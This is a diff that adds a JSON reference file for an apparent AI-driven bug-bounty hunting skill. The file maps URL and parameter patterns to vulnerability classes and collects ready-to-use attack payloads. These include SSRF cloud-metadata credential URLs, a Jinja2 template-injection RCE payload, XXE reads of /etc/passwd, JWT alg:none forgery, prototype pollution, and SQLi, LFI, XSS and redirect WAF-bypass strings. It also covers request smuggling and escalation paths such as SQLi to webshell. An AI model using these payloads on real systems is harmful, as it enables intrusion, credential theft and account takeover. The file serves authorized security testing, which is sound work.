@@ -1,0 +1,781 @@
+{
+  "meta": {
+    "source": "Claude-BugHunter hunt-* skills (681 disclosed reports distilled)",
+    "purpose": "Detection patterns, payloads, bypass tables, chains, and triage rules per vulnerability class",
+    "entries": 39
+  },
+  "class_weights": {
+    "rce": 100,
+    "sqli": 90,
+    "ssrf": 85,
+    "auth-bypass": 85,
+    "idor": 80,
+    "deserialization": 88,
+    "xxe": 75,
+    "ssti": 88,
+    "lfi": 78,
+    "llm-ai": 70,
+    "graphql": 65,
+    "open-redirect": 40,
+    "xss": 55,
+    "cors": 45,
+    "csrf": 50,
+    "info-leak": 30,
+    "race-condition": 70,
+    "business-logic": 65,
+    "shadow-api": 60
+  },
+  "priority_rank_hints": {
+    "p1": [
+      "api.",
+      "api-",
+      "graphql",
+      "auth.",
+      "sso.",
+      "login.",
+      "account.",
+      "admin.",
+      "internal.",
+      "intranet.",
+      "staging.",
+      "stage.",
+      "dev.",
+      "test.",
+      "uat.",
+      "qa.",
+      "gateway.",
+      "gw.",
+      "vpn.",
+      "portal.",
+      "sandbox."
+    ],
+    "kill": [
+      "cdn.",
+      "static.",
+      "assets.",
+      "img.",
+      "images.",
+      "media.",
+      "fonts."
+    ]
+  },
+  "param_noise": [
+    "utm_",
+    "gclid",
+    "fbclid",
+    "msclkid",
+    "mc_cid",
+    "mc_eid",
+    "ref",
+    "trk",
+    "v",
+    "ver",
+    "_",
+    "ts",
+    "cache",
+    "cb",
+    "rnd",
+    "version"
+  ],
+  "url_pattern_to_classes": [
+    {
+      "pattern": "[?&](url|next|redirect|return|callback|target|destination|continue|goto|redir|redirect_uri|returnTo|return_url|checkout_url|success_url|cancel_url|forward|location)=",
+      "classes": [
+        "open-redirect",
+        "ssrf"
+      ]
+    },
+    {
+      "pattern": "[?&](id|user|userid|user_id|uid|pid|post|order|invoice|account|accountid|orderid|docid|oid|ref|thread_id|org_id|business_id|migration_id|voucher_id)=\\d",
+      "classes": [
+        "idor"
+      ]
+    },
+    {
+      "pattern": "/(api|rest|v[0-9]|v1|v2|v3|v4)/",
+      "classes": [
+        "api-misconfig",
+        "idor",
+        "shadow-api"
+      ]
+    },
+    {
+      "pattern": "/graphql",
+      "classes": [
+        "graphql"
+      ]
+    },
+    {
+      "pattern": "/(login|signin|signup|register|forgot|reset|password)",
+      "classes": [
+        "auth-bypass",
+        "ato",
+        "forgot-password"
+      ]
+    },
+    {
+      "pattern": "/(2fa|mfa|otp|verify)",
+      "classes": [
+        "mfa-bypass"
+      ]
+    },
+    {
+      "pattern": "/(parse-xml|import-xml|\\.xml|soap|wsdl|service\\.asmx|xmlrpc\\.php)",
+      "classes": [
+        "xxe",
+        "auth-bypass"
+      ]
+    },
+    {
+      "pattern": "/(file|download|read|doc|document|attachment|content|static|upload/(download))",
+      "classes": [
+        "lfi",
+        "idor"
+      ]
+    },
+    {
+      "pattern": "/(proxy|fetch|webhook|callback|notify|import|convert|preview|thumbnail)",
+      "classes": [
+        "ssrf"
+      ]
+    },
+    {
+      "pattern": "/(search|query|filter|sort|keyword)",
+      "classes": [
+        "sqli",
+        "xss"
+      ]
+    },
+    {
+      "pattern": "/(checkout|order|subscribe|payment|pay|redeem|apply-coupon|use-code|claim|purchase|confirm|transfer|withdraw|send-money|invite|referral|accept-invite|upgrade|activate|trial)",
+      "classes": [
+        "business-logic",
+        "race-condition"
+      ]
+    },
+    {
+      "pattern": "/(upload|avatar|image|import|file)",
+      "classes": [
+        "file-upload"
+      ]
+    },
+    {
+      "pattern": "/jenkins|jnlpJars|/cli",
+      "classes": [
+        "rce"
+      ]
+    },
+    {
+      "pattern": "/functionRouter|/uppercase|/lowercase",
+      "classes": [
+        "rce",
+        "ssti"
+      ]
+    },
+    {
+      "pattern": "/actuator/|/management/|/swagger-ui|/api-docs|/v[0-9]+/api-docs|/openapi\\.json|/swagger\\.json",
+      "classes": [
+        "api-misconfig",
+        "info-leak"
+      ]
+    },
+    {
+      "pattern": "/saml|/sso/saml|/Shibboleth\\.sso",
+      "classes": [
+        "saml"
+      ]
+    },
+    {
+      "pattern": "/oauth|/authorize|/token|/connect/|/callback",
+      "classes": [
+        "oauth"
+      ]
+    },
+    {
+      "pattern": "/(vote|upvote|like|favorite|follow|subscribe|delete|deactivate|cancel)",
+      "classes": [
+        "race-condition"
+      ]
+    },
+    {
+      "pattern": "/(sidekiq|rails/mailers|admin/import|graphql|internal|debug|test|staging)",
+      "classes": [
+        "info-leak",
+        "auth-bypass"
+      ]
+    }
+  ],
+  "param_to_classes": {
+    "redirect_family": [
+      "open-redirect",
+      "ssrf"
+    ],
+    "fetch_family": [
+      "ssrf"
+    ],
+    "file_family": [
+      "lfi"
+    ],
+    "idor_family": [
+      "idor",
+      "sqli"
+    ],
+    "query_family": [
+      "sqli",
+      "xss"
+    ],
+    "auth_family": [
+      "auth-bypass"
+    ],
+    "predefined": {
+      "open-redirect": [
+        "url",
+        "uri",
+        "next",
+        "redirect",
+        "return",
+        "returnurl",
+        "return_url",
+        "callback",
+        "goto",
+        "dest",
+        "destination",
+        "continue",
+        "u",
+        "link",
+        "target",
+        "returnTo",
+        "redir",
+        "forward",
+        "location",
+        "redirect_uri",
+        "checkout_url",
+        "success_url",
+        "cancel_url"
+      ],
+      "lfi": [
+        "file",
+        "path",
+        "page",
+        "template",
+        "include",
+        "doc",
+        "document",
+        "filename",
+        "filepath",
+        "load"
+      ],
+      "ssrf": [
+        "image",
+        "imageurl",
+        "image_url",
+        "fetch",
+        "webhook",
+        "proxy",
+        "feed",
+        "host",
+        "port",
+        "ip",
+        "endpoint",
+        "load_url",
+        "remote"
+      ],
+      "idor": [
+        "id",
+        "uid",
+        "user",
+        "userid",
+        "user_id",
+        "account",
+        "accountid",
+        "order",
+        "orderid",
+        "invoice",
+        "docid",
+        "pid",
+        "oid",
+        "ref",
+        "org_id",
+        "business_id",
+        "thread_id",
+        "voucher_id"
+      ],
+      "sqli": [
+        "q",
+        "query",
+        "search",
+        "keyword",
+        "s",
+        "term",
+        "filter",
+        "sort"
+      ],
+      "mass-assignment": [
+        "role",
+        "is_admin",
+        "verified",
+        "permissions",
+        "org_id",
+        "tenant_id"
+      ]
+    },
+    "name_rules": [
+      {
+        "match": "redirect family names",
+        "classes": [
+          "open-redirect",
+          "ssrf"
+        ]
+      },
+      {
+        "match": "image|imageurl|fetch|webhook|proxy|feed|remote|load_url|endpoint|host|ip|port",
+        "classes": [
+          "ssrf"
+        ]
+      },
+      {
+        "match": "file|path|page|template|include|doc|document|filename|filepath|load (not ending in id)",
+        "classes": [
+          "lfi"
+        ]
+      },
+      {
+        "match": "id|uid|pid|oid|gid or *_id or user|account|order|invoice|node|post|item|doc|page|cat|tag|profile|thread|org|business|voucher",
+        "classes": [
+          "idor",
+          "sqli"
+        ]
+      },
+      {
+        "match": "q|s|query|search|keyword|filter|term|sort|name|email|cat|tag|lang",
+        "classes": [
+          "sqli",
+          "xss"
+        ]
+      },
+      {
+        "match": "auth|token|session|login|sso|saml|oauth|csrf",
+        "classes": [
+          "auth-bypass"
+        ]
+      },
+      {
+        "match": "default",
+        "classes": [
+          "sqli",
+          "xss",
+          "idor"
+        ]
+      }
+    ]
+  },
+  "legacy_protocol_matrix": [
+    {
+      "tech": "WordPress",
+      "endpoint": "/xmlrpc.php",
+      "note": "system.listMethods, wp.getUsersBlogs, system.multicall batching bypasses rate limit"
+    },
+    {
+      "tech": "WordPress REST",
+      "endpoint": "/?rest_route=/wp/v2/users or /wp-json/wp/v2/users",
+      "note": "unauthenticated user enumeration"
+    },
+    {
+      "tech": "SharePoint",
+      "endpoint": "/_vti_bin/Authentication.asmx",
+      "note": "Mode+Login SOAP, native Forms creds, NO rate limit"
+    },
+    {
+      "tech": "Atlassian",
+      "endpoint": "/rest/auth/1/session, /rest/api/2/myself",
+      "note": "native creds under Crowd/Atlassian Access"
+    },
+    {
+      "tech": "Drupal",
+      "endpoint": "/jsonapi/, /user/login?_format=json",
+      "note": "bypasses SSO middleware"
+    },
+    {
+      "tech": "Joomla",
+      "endpoint": "/administrator/index.php?option=com_login, /api/index.php/v1/users",
+      "note": ""
+    },
+    {
+      "tech": "Exchange/OWA",
+      "endpoint": "/EWS/Exchange.asmx, /Autodiscover/Autodiscover.xml",
+      "note": "CVE-2020-0688 / CVE-2021-26855"
+    },
+    {
+      "tech": "Citrix/F5",
+      "endpoint": "/cgi/login, /mgmt/tm/util/bash",
+      "note": ""
+    },
+    {
+      "tech": "ASP.NET generic",
+      "endpoint": "*.asmx?WSDL, *.svc?WSDL, trace.axd, elmah.axd, .disco",
+      "note": ""
+    },
+    {
+      "tech": "Spring Boot",
+      "endpoint": "/actuator/*, /management/*, /api/v1/auth/login, /api/v1/swagger-ui",
+      "note": ""
+    },
+    {
+      "tech": "Jenkins/GitLab/TeamCity",
+      "endpoint": "/jnlpJars/jenkins-cli.jar, /script; /api/v3/*, /api/v4/users; /app/rest/users",
+      "note": ""
+    },
+    {
+      "tech": "Tomcat/WebLogic/Oracle EBS",
+      "endpoint": "/manager/html; /console/login/LoginForm.jsp; /OA_HTML/AppsLogin",
+      "note": ""
+    }
+  ],
+  "payloads": {
+    "ssrf": {
+      "aws": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "gcp": "http://metadata.google.internal/computeMetadata/v1/ (+ Metadata-Flavor: Google)",
+      "azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01 (+ Metadata: true)",
+      "oob": "collaborator sub-tagged per sink (e.g., dlsrcurl.<collab>)"
+    },
+    "ssti": {
+      "jinja2_rce": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+      "probe": "{{7*7}} -> 49 (or ${7*7})"
+    },
+    "lfi": {
+      "php_filter": "php://filter/convert.base64-encode/resource=index.php",
+      "log_poison_first_verify_readable": true,
+      "phar": "phar://"
+    },
+    "xxe": {
+      "doctype": "<!DOCTYPE foo [<!ENTITY x SYSTEM 'file:///etc/passwd'>]>",
+      "gate": "OOB or it didn't happen"
+    },
+    "xss": {
+      "canary": "alert(91234) unique numeric",
+      "proof": "unescaped <script>alert(CANARY in body; &lt;script&gt; = safe"
+    },
+    "html-injection": {
+      "canary": "\"><img src=x onerror=alert(91234)> or <svg onload=alert(91234)>",
+      "note": "script not required - HTML reflection alone = phishing/defacement"
+    },
+    "sqli": {
+      "order": "UNION over blind boolean when response reflects rows; enumerate columns, never guess",
+      "no_sql": "$regex (Rocket.Chat), $where (Mongoose), $filter OData operators"
+    },
+    "jwt": {
+      "alg_none": "base64({\"alg\":\"none\"}).base64({\"sub\":1,\"role\":\"admin\"}).",
+      "rs2hs": "HS256 with public key from /.well-known/jwks.json as secret"
+    },
+    "prototype_pollution": [
+      "{\"__proto__\":{\"polluted\":\"pp-1337\"}}",
+      "{\"constructor\":{\"prototype\":{\"polluted\":\"pp-1337\"}}}",
+      "__proto__[polluted]=pp-1337",
+      "{\"__proto__\":{\"json spaces\":10}}",
+      "{\"__proto__\":{\"isAdmin\":true,\"role\":\"admin\"}}",
+      "{\"__proto__\":{\"shell\":\"/bin/bash\",\"argv0\":\"node\",\"NODE_OPTIONS\":\"--inspect\"}}"
+    ],
+    "server_side_param_pollution": [
+      "username=administrator%23",
+      "username=administrator%3f",
+      "username=administrator%2f..%2fvictimuser",
+      "username=administrator/../victimuser",
+      "username=administrator/field/id%23",
+      "username=administrator/field/passwordResetToken%23"
+    ],
+    "odata": {
+      "detect": "$metadata anonymously; headers OData-Version: 4.0 / DataServiceVersion: 3.0",
+      "blind_extract": "/_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'a')",
+      "acls_skip": "$orderby=emailaddress1 desc&$select=fullname",
+      "batch_waf_bypass": "POST /odata/$batch multipart/mixed; inner GET Users?$filter=1 eq 1",
+      "expand_idor": "/Orders?$expand=Customer($expand=PaymentMethods($expand=Card))"
+    },
+    "race": {
+      "identical": "N identical requests; >=2 return 2xx = limit overrun/double spend",
+      "partial_construction": "A: POST /register user=... ; B: GET /confirm token= (blank) in window (GitLab CVE-2022-4037)",
+      "tooling": [
+        "HTTP/2 single-packet",
+        "curl --next",
+        "Turbo Intruder gate+openGate",
+        "Flatt first-seq for N>30"
+      ],
+      "evidence_gate": ">=3/5 reproducible from fresh account; single anomaly = noise"
+    },
+    "http_smuggling": {
+      "clte": "POST / HTTP/1.1 + Content-Length: 13 + Transfer-Encoding: chunked + body 0\\r\\n\\r\\nSMUGGLED",
+      "2026_warning": "classic CL.TE/TE.CL not universal; H2.CL and H2.TE variants"
+    },
+    "open_redirect_bypasses": [
+      "//evil.com",
+      "/\\\\evil.com",
+      "https://target.com@evil.com",
+      "//evil.com/%2F..",
+      "%2Fevil.com",
+      "evil.com%00target.com",
+      "evil.com%09",
+      "javascript:window.location='/evil'",
+      "data:text/html,<script>window.location='/evil'</script>"
+    ],
+    "cache_poison_headers": [
+      "X-Forwarded-Host",
+      "X-Host",
+      "X-Forwarded-Server",
+      "X-HTTP-Host-Override",
+      "Forwarded",
+      "X-Original-URL",
+      "X-Rewrite-URL",
+      "X-Forwarded-Scheme",
+      "X-Forwarded-Proto",
+      "True-Client-IP"
+    ],
+    "ssrf_unkeyed_note": "X-Original-URL alone does NOT compose with Host; path-override needs REAL Host",
+    "forgot_password": {
+      "patterns": [
+        "username enumeration (diff msg/status/length/timing)",
+        "token in API response body",
+        "token replay (second use succeeds)",
+        "no IP binding",
+        "no rate limit 10-20 POSTs"
+      ],
+      "weak_tokens": [
+        "base64(email+timestamp)",
+        "4-6 digit numeric",
+        "sequential"
+      ]
+    },
+    "shadow_api_versions": [
+      "v1",
+      "v2",
+      "v3",
+      "v4",
+      "beta",
+      "alpha",
+      "internal",
+      "legacy",
+      "old",
+      "2022-01-01",
+      "2023-01-01",
+      "2024-01-01"
+    ],
+    "shadow_api_headers": [
+      "X-API-Version: 1",
+      "Accept: application/vnd.company.v1+json"
+    ],
+    "source_leak_quick": [
+      ".env",
+      ".env.production",
+      ".env.local",
+      ".git/HEAD",
+      "swagger.json",
+      "openapi.json",
+      "api-docs",
+      "build-info.json",
+      "package.json",
+      "composer.json",
+      "Gemfile",
+      "Dockerfile",
+      "docker-compose.yml",
+      ".dockerenv",
+      ".DS_Store",
+      "WEB-INF/web.xml",
+      "META-INF/MANIFEST.MF",
+      "phpinfo.php",
+      "server-status",
+      ".htaccess",
+      "web.config",
+      "crossdomain.xml",
+      "clientaccesspolicy.xml"
+    ],
+    "waf_bypass_hints": [
+      "JSON/XML content-type switch",
+      "mixed case",
+      "double-encoding %2524filter",
+      "OData operators never match SQLi signatures",
+      "HTTP parameter pollution",
+      "nested JSON wrapper {\"data\":{\"id\":\"VICTIM_ID\"}}"
+    ]
+  },
+  "chain_table": [
+    [
+      "open-redirect",
+      "+ OAuth redirect_uri -> auth code theft",
+      "ATO (Critical)"
+    ],
+    [
+      "clickjacking",
+      "+ sensitive action + working PoC",
+      "Medium"
+    ],
+    [
+      "cors wildcard",
+      "+ credentialed request exfils PII",
+      "High"
+    ],
+    [
+      "csrf",
+      "+ sensitive action (transfer/email change/delete)",
+      "High"
+    ],
+    [
+      "rate limit bypass",
+      "+ OTP/reset token brute force succeeds",
+      "Medium/High"
+    ],
+    [
+      "ssrf dns-only",
+      "+ internal service access + data",
+      "Medium"
+    ],
+    [
+      "host header",
+      "+ password reset email uses injected host",
+      "High"
+    ],
+    [
+      "prompt injection",
+      "+ reads other user's data (IDOR)",
+      "High"
+    ],
+    [
+      "self-xss",
+      "+ CSRF to trigger on victim",
+      "Medium"
+    ],
+    [
+      "subdomain takeover",
+      "+ OAuth redirect_uri at taken subdomain",
+      "Critical"
+    ],
+    [
+      "graphql introspection",
+      "+ auth bypass mutation or IDOR on node()",
+      "High"
+    ],
+    [
+      "open-redirect without chain",
+      "rejected alone",
+      "KILL"
+    ]
+  ],
+  "never_submit": [
+    "missing CSP/HSTS/security headers alone",
+    "missing SPF/DKIM/DMARC",
+    "graphql introspection alone",
+    "banner/version disclosure without working CVE",
+    "clickjacking on non-sensitive pages",
+    "tabnabbing",
+    "csv injection without code execution",
+    "CORS wildcard without credential exfil proof",
+    "logout CSRF",
+    "self-xss (own account only)",
+    "open redirect alone (no ATO/OAuth chain)",
+    "OAuth client_secret in mobile app",
+    "SSRF DNS callback only",
+    "host header injection alone (no reset poisoning PoC)",
+    "rate limit on non-critical forms",
+    "session not invalidated on logout",
+    "concurrent sessions",
+    "internal IP in error message",
+    "mixed content",
+    "weak SSL ciphers",
+    "missing HttpOnly/Secure alone",
+    "broken external links",
+    "autocomplete on password fields"
+  ],
+  "auth_sweep_note": "declared-secured != enforced: probe declared-secured OpenAPI ops unauthenticated with junk ids + empty {} bodies; 200/201/202/204/422 = broken. Layer-ordering trap: malformed-body 400 is NOT an auth bypass - resend with well-formed '{}' and expect 401.",
+  "sibling_function_rule": "if 9 endpoints under a path enforce auth middleware, the 10th that doesn't is the bug",
+  "version_behavioral_diff": "shadow API: old version missing rate limit / weaker auth / extra fields / accepts what new rejects = finding (version difference alone = informational)",
+  "timing_statistics": {
+    "n_min": 10,
+    "interleaved": true,
+    "signal": "mean >= 2 sigma above control",
+    "single_outlier_warning": "jitter, not signal"
+  },
+  "marker_discipline": [
+    "8+ random alphanumeric chars",
+    "never 'test'/'marker'/'evil'/domain names",
+    "check baseline response for marker first",
+    "sub-tag OOB payloads per sink"
+  ],
+  "body_diff_rule": "status-code-only bypass claims are the most common N/A; always diff bodies",
+  "content_type_rule": "HTML forms need application/x-www-form-urlencoded; API/JSON endpoints need application/json - wrong content-type gives false-negative 200",
+  "escalation_paths": {
+    "xss": [
+      "steal cookie/token -> ATO",
+      "HttpOnly? force email change via XHR -> ATO",
+      "self-xss + CSRF = Medium"
+    ],
+    "idor": [
+      "read PII -> automate scale",
+      "change password/email -> ATO",
+      "uuid -> find leak source"
+    ],
+    "ssrf": [
+      "dns-only -> DON'T report, try metadata",
+      "metadata keys -> RCE"
+    ],
+    "sqli": [
+      "error-based extract",
+      "INTO OUTFILE -> webshell",
+      "blind boolean/time"
+    ]
+  },
+  "waf_bypass_payloads": {
+    "xss": [
+      "<svg/onload=alert(91234)>",
+      "<ScRiPt>alert(91234)</sCrIpT>",
+      "%253Cscript%253Ealert(91234)%253C%252Fscript%253E",
+      "{\"data\":\"<img src=x onerror=alert(91234)>\"}",
+      "alert%091234",
+      "colon-in-href: javascript&colon;alert(91234)"
+    ],
+    "sqli": [
+      "1' OR '1'='1",
+      "1%2527%2520OR%25201%253D1",
+      "1' OR 1=1 -- -",
+      "json: {\"id\":\"1' OR '1'='1\"}",
+      "id=1&id=1' OR '1'='1 (HPP: WAF sees first)",
+      "$filter=id eq 1 (OData operators never match SQLi signatures)",
+      "id=1 order by 1-- (UNION via blind boolean)"
+    ],
+    "lfi": [
+      "/index.php?page=....//....//etc/passwd",
+      "page=php://filter/convert.base64-encode/resource=index",
+      "page=/etc/passwd%00",
+      "page=c:/windows/win.ini (encoded %5c)",
+      "page=....//....//....//etc/passwd (dot-dot-slash filter confusion)"
+    ],
+    "ssti": [
+      "${7*7}",
+      "{{7*7}}",
+      "{% print 7*7 %}",
+      "%7B%7B7*7%7D%7D (double-encoded braces)",
+      "json: {\"name\":\"{{7*7}}\"}",
+      "${7*7} (Jinja2 vs Twig delimiter swap)"
+    ],
+    "redirect": [
+      "?next=//evil.com",
+      "?url=/%2f%2fevil.com",
+      "?redirect=https%3A%2F%2Fevil.com",
+      "?next=/\\evil.com (backslash confusion)",
+      "?domain=evil.com%2f%2f.",
+      "?url=javascript&colon;alert(1)"
+    ],
+    "ssrf": [
+      "url=http://127.0.0.1",
+      "url=http://127.0.0.1%23@evil.com",
+      "url=http://[::1]",
+      "url=http://216.58.197.110.nip.io (DNS rebinding style)",
+      "url=http://127.0.0.1:@evil.com",
+      "url=file:///etc/passwd (protocol switch when http blocked)"
+    ],
+    "smuggling": [
+      "CL.TE: Content-Length: 13 + Transfer-Encoding: chunked",
+      "TE.CL: Transfer-Encoding: chunked + Content-Length: 4",
+      "H2.CL and H2.TE variants (HTTP/2 request smuggling)",
+      "obfuscated TE: Transfer-Encoding : chunked (space before colon)",
+      "double CL (RFC confusable) + TE",
+      "json body for parser-confusion (proxy parses body, backend parses headers)"
+    ]
+  }
+}
